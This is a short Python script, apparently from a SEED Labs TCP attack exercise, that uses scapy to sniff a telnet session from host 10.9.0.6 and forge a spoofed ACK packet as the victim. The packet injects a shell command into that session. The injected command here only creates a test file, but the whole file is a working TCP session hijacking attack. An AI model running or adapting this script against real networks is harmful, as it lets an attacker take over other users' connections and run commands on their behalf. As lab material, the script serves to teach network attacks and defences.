#!/usr/bin/env python3

from scapy.all import *

def get_info(pkt):
    #print("SENDING HIJACK PACKET..........")
    #sniffing packet from server/end host
    #sending packet as user/victim
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].ack , ack=pkt[TCP].seq)
    data =  "\n touch /home/seed/test.txt\n"
    hijackPkt = ip/tcp/data
    #ls(hijackPkt)
    send(hijackPkt, iface="br-14fcdedbf20a", verbose=0)

pkt = sniff(iface="br-14fcdedbf20a", filter="tcp and src host 10.9.0.6 and src port 23", prn=get_info)
